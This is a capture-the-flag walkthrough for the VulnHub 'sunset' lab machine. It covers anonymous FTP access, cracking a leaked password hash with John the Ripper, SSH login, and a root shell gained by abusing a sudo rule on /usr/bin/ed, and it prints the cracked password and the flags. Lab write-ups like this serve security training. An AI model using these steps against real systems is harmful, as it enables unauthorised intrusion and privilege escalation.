sunset

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Anonymous FTP
[+] John The Ripper Cracking password
[+] Privilege Escalation/Lateral Movement by abusing SUDO rights - /usr/bin/ed
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Nmap scan results
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.109
Host is up (0.00026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root         1062 Jul 29 00:00 backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.56.109:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 71:bd:fa:c5:8c:88:7c:22:14:c4:20:03:32:36:05:d6 (RSA)
|   256 35:92:8e:16:43:0c:39:88:8e:83:0d:e2:2c:a4:65:91 (ECDSA)
|_  256 45:c5:40:14:49:cf:80:3c:41:4f:bb:22:6c:80:1e:fe (ED25519)
MAC Address: 08:00:27:22:45:A1 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.26 ms 192.168.56.109

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.63 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to ftp://192.168.56.109 ftp we get a backup file with credentials

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.                                                                                                                  
datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/                                                                                                              
sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0                                                                                                                     
sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/ 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Trying to crack the password with john. First we try to get the password for user sunset. 

echo ‘sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
’ > passfile

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/sunset# john passfile 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Wordlist
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 3 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 3 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 6 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8
needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
cheer14          (sunset)
1g 0:00:02:22 DONE 3/3 (2019-10-03 01:12) 0.007031g/s 2277p/s 2277c/s 2277C/s secrina..cariell
Use the "--show" option to display all of the cracked passwords reliably
Session completed

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We are able to login with sunset: cheer14

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh sunset@192.168.56.109
sunset@192.168.56.109's password: 
Linux sunset 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 28 20:52:38 2019 from 192.168.1.182
sunset@sunset:~$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting root
Sunset is running with sudo -l privileges

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sunset@sunset:~$ sudo -l
Matching Defaults entries for sunset on sunset:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sunset may run the following commands on sunset:
    (root) NOPASSWD: /usr/bin/ed
sunset@sunset:~$ sudo /usr/bin/ed
!/bin/bash
root@sunset:/home/sunset#
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting the Flag

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@sunset:/home/sunset# cat /root/flag.txt 
25d7ce0ee3cbf71efbac61f85d0c14fe
root@sunset:/home/sunset# cat user.txt
5b5b8e9b01ef27a1cc0a2d5fa87d7190

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

